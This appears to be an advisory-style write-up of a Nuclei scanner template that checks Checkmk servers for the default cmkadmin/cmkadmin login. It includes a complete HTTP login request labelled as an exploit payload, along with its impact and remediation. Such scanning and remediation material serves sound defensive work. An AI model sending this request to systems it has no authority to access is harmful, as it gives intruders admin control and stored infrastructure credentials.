# Nuclei Template: Checkmk - Default Login
**Template ID:** checkmk-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`checkmk-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Checkmk monitoring instance is accessible with default credentials (cmkadmin/cmkadmin). This provides full administrative access to the monitoring platform, including the ability to view all monitored hosts, execute commands on agents, and access stored credentials.

## Impact
An attacker with admin access to Checkmk can view the entire monitored infrastructure, access stored SNMP community strings and SSH credentials, execute commands on monitored hosts via the agent, and gain visibility into the organization's network topology.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}
POST {{endpoint}} HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0FYqMzKWywSgTEcE

------WebKitFormBoundary0FYqMzKWywSgTEcE
Content-Disposition: form-data; name="filled_in"

login
------WebKitFormBoundary0FYqMzKWywSgTEcE
Content-Disposition: form-data; name="_login"

1
------WebKitFormBoundary0FYqMzKWywSgTEcE
Content-Disposition: form-data; name="_origtarget"

index.py
------WebKitFormBoundary0FYqMzKWywSgTEcE
Content-Disposition: form-data; name="_username"

cmkadmin
------WebKitFormBoundary0FYqMzKWywSgTEcE
Content-Disposition: form-data; name="_password"

cmkadmin
------WebKitFormBoundary0FYqMzKWywSgTEcE
Content-Disposition: form-data; name="_login"

Login
------WebKitFormBoundary0FYqMzKWywSgTEcE--
```

## Remediation
Change the default cmkadmin password immediately after installation using 'cmk-passwd cmkadmin' or through the web interface.

## References
- https://docs.checkmk.com/latest/en/intro_setup.html
- https://docs.checkmk.com/latest/en/wato_user.html
